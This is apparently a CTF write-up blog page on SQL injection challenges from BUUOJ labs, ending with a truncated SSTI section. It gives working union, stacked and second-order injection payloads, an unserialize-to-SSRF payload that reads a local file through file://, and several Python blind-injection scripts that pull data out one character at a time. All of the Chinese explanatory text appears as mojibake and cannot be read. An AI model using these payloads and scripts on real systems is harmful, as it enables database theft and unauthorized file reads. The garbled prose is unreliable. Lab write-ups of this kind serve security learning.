title="[å¼ºç½‘æ¯2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯2019]éšä¾¿æ³¨</h2><p>å‘Šè¯‰æˆ‘ä»¬æ³¨å…¥ç‚¹äº†</p><p>å‚æ•°ç±»å‹ï¼Œç”±è¯­æ³•é”™è¯¯å¯çŸ¥æ˜¯å•å¼•å·é—­åˆ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure><p>ç»è¿‡æµ‹è¯•æ˜¯å †å æ³¨å…¥ï¼Œæ‰€ä»¥å…¶åç«¯sqlæŸ¥è¯¢ä½¿ç”¨çš„æ˜¯mysqli_multi_query() </p><p>å¹¶ä¸”æœ‰è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure><p>é€šè¿‡show tablesçŸ¥é“è¡¨åï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨handleæ¥ç»•è¿‡selectï¼Œå¾—åˆ°è¡¨ä¸­çš„ä¿¡æ¯ã€‚</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>åªæœ‰ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œæ— æ³¨å†Œç•Œé¢ï¼Œç›®å½•æ‰«ææ— ç»“æœã€‚</p><p>æµ‹è¯•ä¸ºå•å¼•å·é—­åˆã€‚</p><p>åœ¨ç™»å½•åçš„search.phpæºä»£ç ä¸­æ‰¾åˆ°æ³¨é‡Šï¼Œç»è¿‡è§£ç å¾—åˆ°<code>select * from user where username = &#39;$name&#39;</code></p><p>çŒœæµ‹ç™»é™†ä¸Šå»å³å¯è·å¾—flag</p><p>é€šè¿‡è”åˆæŸ¥è¯¢æ„é€ ä¸´æ—¶ç”¨æˆ·</p><p>username&#x3D;<code>1&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#</code></p><p>passwd&#x3D;<code>1</code></p><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯å‰é¢ä¸èƒ½ä¸ºadminâ€™ï¼Œä¸ç„¶å®ƒå°±ä¼šå»æ¯”è¾ƒåŸæ¥adminæ‰€å¯¹åº”çš„å¯†ç </p></blockquote><p>æˆåŠŸç™»å½•è·å¾—flagã€‚</p><h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>joinæ³¨å†Œåï¼Œç‚¹å‡»usernameï¼Œå‘ç°urlå‚æ•°<code>view.php?no=1</code>ï¼Œå¯èƒ½å­˜åœ¨sqlæ³¨å…¥</p><p>è¿›è¡Œæµ‹è¯•ï¼Œ<code>1^0</code>é¡µé¢æŠ¥é”™ï¼Œæ‰€ä»¥å­˜åœ¨sqlæ³¨å…¥</p><p>åˆ¤æ–­å‚æ•°ç±»å‹ï¼Œå‘ç°ä¸ºæ•´å‹</p><p>è¿›è¡Œfuzzï¼Œå‘ç°<code>union select</code>è¢«è¿‡æ»¤</p><p><img src="/../images/image-20220728125208126-1687489655110.png" alt="image-20220728125208126"></p><p>å°è¯•æ„é€ <code>union/**/select</code>ç»•è¿‡</p><p><img src="/../images/image-20220728125647157-1687489655112.png" alt="image-20220728125647157"></p><p>å‘ç°å¯ä»¥ç»•è¿‡ï¼Œä¸”å­—æ®µæ•°ä¸ä¸º3</p><p><img src="/../images/image-20220728125537515-1687489655113.png" alt="image-20220728125537515"></p><p>å‘ç°ååºåˆ—åŒ–å‡½æ•°ï¼Œå­—æ®µæ•°ä¸º4ï¼Œå¯åˆ©ç”¨çš„å­—æ®µåœ¨2ä½ç½®</p><blockquote><p>åˆ°è¿™é‡Œsqlæ³¨å…¥å°±æœ‰ä¸¤ä¸ªæ€è·¯ï¼Œä¸€æ˜¯è”åˆæ³¨å…¥(é¡µé¢æœ‰å›æ˜¾ç‚¹)ï¼ŒäºŒæ˜¯æŠ¥é”™æ³¨å…¥ï¼ˆé¡µé¢æœ‰æŠ¥é”™æ—¥å¿—ï¼Œè¿™é‡Œè¿‡æ»¤äº†0x7eï¼‰ã€‚</p></blockquote><p>æ¥ä¸‹æ¥æŒ‰ç…§æ­£å¸¸æ€è·¯åšå³å¯ã€‚</p><p>æœ€åæŸ¥å­—æ®µå€¼æ—¶ä¼šå‘ç°usersè¡¨çš„ç¬¬å››åˆ—dataä¸­å­˜æ”¾çš„æ˜¯ç»è¿‡åºåˆ—åŒ–åçš„ç”¨æˆ·çš„ä¿¡æ¯</p><p><img src="/../images/image-20220728172644784-1687489655113.png" alt="image-20220728172644784"></p><p>å…³äºååºåˆ—åŒ–ï¼Œå°±ä¸€å®šè¦æœ‰æºç ã€‚</p><p>è¿›è¡Œç›®å½•æ‰«æå¾—åˆ°user.php.bakï¼Œä»¥åŠflag.phpçš„å­˜åœ¨</p><p>ä¸»è¦å…³æ³¨</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">#ç”¨curlå¯¹åšå®¢åœ°å€å‘èµ·è¯·æ±‚ï¼Œå¹¶è·å–å†…å®¹</span></span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ„é€ åºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">#åˆ©ç”¨fileåè®®è¯·æ±‚æœ¬åœ°æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?no=-<span class="number">1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡ŒæŠŠå…¶æ”¾åœ¨ç¬¬å››åˆ—ï¼Œæ˜¯å› ä¸ºåšå®¢ä¿¡æ¯æ˜¯å­˜å‚¨åœ¨usersè¡¨çš„ç¬¬å››åˆ—dataä¸­çš„</p><p>èƒ½å¤ŸæˆåŠŸçš„åŸå› æ˜¯union&#x2F;**&#x2F;selectä¸åŠ è¡¨åçš„ç‰¹æ€§ï¼Œä¼šåœ¨å‰é¢çš„selectè¡¨ä¸­æ„é€ ä¸´æ—¶æ•°æ®ã€‚</p></blockquote><p>æœ€ååœ¨æºä»£ç blog contentéƒ¨åˆ†å¯ä»¥å¾—åˆ°flag.phpçš„å†…å®¹ã€‚</p><p><img src="/../images/image-20220728173710364-1687489655113.png" alt="image-20220728173710364"></p><h2 id="ç½‘é¼æ¯2018-Unfinish"><a href="#ç½‘é¼æ¯2018-Unfinish" class="headerlink" title="[ç½‘é¼æ¯2018]Unfinish"></a>[ç½‘é¼æ¯2018]Unfinish</h2><p>åŸç†</p><blockquote><p>åœ¨mysqlä¸­+åªèƒ½å½“ä½œç®—æœ¯è¿ç®—ç¬¦ï¼Œä¸phpä¸­çš„+ç±»ä¼¼ ï¼Œå¯ä»¥è¿›è¡Œæ•°å­—å­—ç¬¦ä¸²+æ•°å­—çš„è®¡ç®—</p></blockquote><p><img src="/../images/image-20220717191455431-1687489655114.png" alt="image-20220717191455431"></p><p>å‰ç½®æ¡ä»¶</p><blockquote><p>æŸ¥è¯¢çš„ç»“æœåªæœ‰ä¸€åˆ—</p></blockquote><p><img src="/../images/image-20220718093833432-1687489655113.png" alt="image-20220718093833432"></p><p>è¿›å»æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä¸€èˆ¬å…ˆæ‰¾æ³¨å†Œç•Œé¢ï¼Œç™»å½•åå†æ‰¾æ³¨å…¥ç‚¹ã€‚</p><p>ç›´æ¥è®¿é—®url&#x2F;register.php</p><p>éœ€è¦å¡«ä¸‰ä¸ªä¿¡æ¯ï¼šé‚®ç®±ï¼Œç”¨æˆ·åï¼Œå¯†ç </p><p>ç™»å½•åï¼Œè§‚å¯Ÿåˆ°é¡µé¢åªæœ‰ä¸€ä¸ªå¯ç–‘ä¹‹å¤„,æ˜¾ç¤ºäº†ç”¨æˆ·å</p><p><img src="/../images/image-20220717182811431-1687489655115.png" alt="image-20220717182811431"></p><p>æ‰€ä»¥ï¼Œæ³¨å…¥ç‚¹åº”è¯¥æ˜¯åœ¨ç”¨æˆ·åå¤„ï¼Œä¸ºå›æ˜¾æ³¨å…¥ã€‚</p><blockquote><p>è¿™é‡Œå¯ä»¥çŒœæµ‹æ˜¾ç¤ºç”¨æˆ·åçš„åç«¯è¯­å¥ä¸º<code>select username from table where email=$email</code></p></blockquote><hr><p>å›åˆ°æ³¨å†Œç•Œé¢ç»§ç»­æµ‹è¯•ï¼ŒéªŒè¯æƒ³æ³•ã€‚</p><p>æ³¨å†Œç”¨æˆ·å1â€æ³¨å†ŒæˆåŠŸï¼Œç”¨æˆ·åä¸º1â€™æ—¶æ³¨å†Œå¤±è´¥</p><p><img src="/../images/image-20220717184809571-1687489655115.png" alt="image-20220717184809571"></p><blockquote><p>çŒœæµ‹æ³¨å†Œçš„sqlè¯­å¥ä¸º<code>insert into table  value(&#39;$email&#39;,&#39;$username&#39;,&#39;$passwd&#39;) </code>å•å¼•å·é—­åˆ</p></blockquote><p>è¿˜æœ‰ä¸€ä¸ªç‚¹å°±æ˜¯ï¼Œé‚®ç®±æ˜¯å”¯ä¸€çš„ï¼Œå¦‚æœç”¨ç›¸åŒçš„é‚®ç®±æ³¨å†Œå¤šä¸ªè´¦å·åªæœ‰ç¬¬ä¸€ä¸ªè´¦å·æ˜¯å¯ä»¥ç™»é™†ä¸Šå»çš„ã€‚</p><p>è¿›è¡Œfuzz</p><p><img src="/../images/image-20220717185630970-1687489655114.png" alt="image-20220717185630970"></p><p>å‘ç°çº¢æ¡†å†…çš„è¢«è¿‡æ»¤</p><p>å› ä¸ºè¯­å¥ä¸º<code>insert into table  value(&#39;$email&#39;,&#39;$username&#39;,&#39;$passwd&#39;) </code></p><p>åªèƒ½ä½¿ç”¨è¿ç®—ç›²æ³¨ï¼ˆå…¶ä»–çš„æ„é€ ä¸äº†ï¼‰</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_url = <span class="string">&#x27;http://645cbdc0-53d4-4a12-8d7c-653400adc1dd.node4.buuoj.cn:81/register.php&#x27;</span></span><br><span class="line">login_url = <span class="string">&#x27;http://645cbdc0-53d4-4a12-8d7c-653400adc1dd.node4.buuoj.cn:81/login.php&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    register_data = &#123;</span><br><span class="line">        <span class="comment">#é‚®ç®±æ˜¯å”¯ä¸€çš„ï¼Œå¦‚æœç”¨ç›¸åŒçš„é‚®ç®±æ³¨å†Œå¤šä¸ªè´¦å·åªæœ‰ç¬¬ä¸€ä¸ªè´¦å·æ˜¯å¯ä»¥ç™»é™†ä¸Šå»çš„ã€‚æ‰€ä»¥æ¯æ¬¡æ³¨å†Œé‚®ç®±éƒ½è¦ä¸åŒ</span></span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;111@123.com&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;0&#x27; + ascii(substr((select * from flag) from &#123;&#125; for 1)) + &#x27;0&quot;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=register_url, data=register_data)</span><br><span class="line"></span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;111@123.com&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res_ = requests.post(url=login_url, data=login_data)</span><br><span class="line">    code = re.search(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, res_.text)</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(code.group(<span class="number">1</span>)))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ip <span class="keyword">from</span> ip_table</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(isset($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] <span class="operator">=</span> $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip <span class="operator">=</span> $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$last_ip <span class="operator">=</span> &quot;&quot;;</span><br><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> query(&quot;select current_ip, last_ip from ip_log where uuid = &#x27;&quot;.addslashes($uuid).&quot;&#x27;&quot;);</span><br><span class="line">if(<span class="built_in">count</span>($<span class="keyword">result</span>) <span class="operator">&gt;</span> <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">    if($ip <span class="operator">!=</span><span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;current_ip&#x27;</span>]) &#123;</span><br><span class="line">        $last_ip <span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;current_ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        query(&quot;delete from ip_log where uuid=&#x27;&quot;.addslashes($uuid).&quot;&#x27;&quot;);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        $last_ip <span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;last_ip&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query(&quot;insert into ip_log values (&#x27;&quot;.addslashes($uuid).&quot;&#x27;, &#x27;&quot;.addslashes($ip).&quot;&#x27;, &#x27;$last_ip&#x27;);&quot;);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡è¡¨ä¸­æ— æ•°æ®ï¼Œif(count($result) &gt; 0)ä¸æˆç«‹ï¼Œ$ip&#x3D;x-forwarded-for1  $last_ip&#x3D;ç©º,æ’å…¥ip_logè¡¨ä¸­</p><p>ç¬¬äºŒæ¬¡ è¡¨ä¸­æœ‰æ•°æ®ï¼Œif(count($result) &gt; 0) æˆç«‹ï¼Œ$ip&#x3D;x-forwarded-for2    $last_ip&#x3D;x-forwarded-for1 ,åˆ é™¤ç¬¬ä¸€æ¬¡æ’å…¥çš„æ•°æ®ï¼Œæ’å…¥ç¬¬äºŒæ¬¡æ•°æ®ã€‚</p><p>ç¬¬ä¸‰æ¬¡è¡¨ä¸­æœ‰æ•°æ®, æŸ¥è¯¢æ—¶ä¼šç”¨åˆ°x-forwarded-for1ï¼Œè¿™é‡Œå°±æ˜¯åˆ©ç”¨ç‚¹</p><blockquote><p>ä¸çœ‹æºç ï¼Œæ¨ä¸å‡ºæ¥</p><p>ä¸‹æ¬¡å¦‚æœçŒœæ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œå¯ä»¥å¤šè¯•å‡ æ¬¡ï¼Œåƒè¿™ä¸ªå°±æ˜¯ç¬¬ä¸‰æ¬¡æ‰§è¡Œ</p></blockquote><p>å•å¼•å·é—­åˆ</p><p>ç¬¬ä¸€æ¬¡è¾“å…¥<code>1&#39; or &#39;1</code></p><p>ç¬¬äºŒæ¬¡è¾“å…¥1</p><p>ç¬¬ä¸‰æ¬¡è¾“å…¥1</p><p><img src="/../images/image-20220812122454399-1687489655115.png" alt="image-20220812122454399"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€æ¬¡çš„è¾“å…¥æ‰§è¡Œäº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.buuoj.cn:26803/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table</span>():</span><br><span class="line">    table = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#æ§åˆ¶é•¿åº¦</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right =<span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> left&lt;right:</span><br><span class="line">            mid = (left+right)//<span class="number">2</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            payload = <span class="string">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;track_uuid=1042e154-3129-4065-939a-e2c5f6d999e5&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;X-Forwarded-For&#x27;</span>:payload,</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># data=&#123;</span></span><br><span class="line">            <span class="comment">#     &#x27;id&#x27;:payload,</span></span><br><span class="line">            <span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line">            <span class="comment">#res = requests.get(url=url,params=data)</span></span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line"></span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;track_uuid=1042e154-3129-4065-939a-e2c5f6d999e5&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;X-Forwarded-For&#x27;</span>:<span class="string">&#x27;payload&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line">            res = requests.post(url=url,headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment"># å­—ç¬¦ä¸²ä¸ºæˆåŠŸçš„æ ‡å¿—</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Last Ip: 1&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># é˜²æ­¢429</span></span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">            mid = (left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        table+=<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(table)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_table()</span><br></pre></td></tr></table></figure><h2 id="ç›²æ³¨ä¹‹asciiåç§»"><a href="#ç›²æ³¨ä¹‹asciiåç§»" class="headerlink" title="ç›²æ³¨ä¹‹asciiåç§»"></a>ç›²æ³¨ä¹‹asciiåç§»</h2><p>ä½¿ç”¨åœºæ™¯</p><ul><li><p>å…³é”®å­—æ— è¿‡æ»¤</p></li><li><p>select * from flag;çš„è¿”å›å€¼åªèƒ½ä¸º1è¡Œ</p></li></ul><ol><li><p>åˆ¤æ–­å­—æ®µæ•°</p><p>å‡è®¾æœ‰å¦‚ä¸‹è¡¨ï¼Œåˆ—æ•°ä¸º2</p><p><img src="/../images/image-20220711155449466-1687489655114.png" alt="image-20220711155449466"></p><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¼šæŠ¥é”™</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)</span><br></pre></td></tr></table></figure></li><li><p>åˆ¤æ–­å­—æ®µå€¼</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)</span><br></pre></td></tr></table></figure></li></ol><p><img src="/../images/image-20220711155653013-1687489655114.png" alt="image-20220711155653013"></p><p>â€‹      <code>select(1,1)</code>çš„è¿”å›å€¼ä¸º1,1;  <code>select * from flag</code>çš„è¿”å›å€¼ä¸º1ï¼Œâ€™flag{xxxx}â€™ï¼›</p><p>â€‹      1ä¸1æ¯”è¾ƒç›¸ç­‰ï¼Œ1ä¸â€™flag{xxxx}â€™æ¯”è¾ƒï¼Œ1&gt;â€™fâ€™,æ‰€ä»¥æœ€åè¿”å›çš„æ˜¯1ã€‚</p><blockquote><p>â€‹     å› ä¸ºmysqlä¸­æ•°å­—ä¸å­—ç¬¦ä¸²æ¯”è¾ƒä¸phpä¸­ç›¸åŒã€‚</p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ ¹æ®æ­¤æ¥ç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://f6dc9323-7652-4182-8dd7-aea9fd09183f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"><span class="comment">#&#123;&#125;çš„ä½ç½®æ˜¯æƒ³è¦è¯»å–çš„å­—æ®µå€¼æ‰€åœ¨åˆ—</span></span><br><span class="line">payload=<span class="string">&#x27;0^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        </span><br><span class="line">        hexchar=flag+<span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line">        params=&#123;<span class="string">&#x27;id&#x27;</span>:payload.<span class="built_in">format</span>(hexchar)&#125;</span><br><span class="line"></span><br><span class="line">        re=requests.post(url=url,data=params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            <span class="comment"># -1æ˜¯å› ä¸ºå½“&gt;æˆç«‹æ—¶ï¼Œå·®å€¼ä¸º1</span></span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</p><p>[pasecactf_2019]flask_ssti</p><p>æç¤º</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">line, key, key2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#x27;</span>, <span 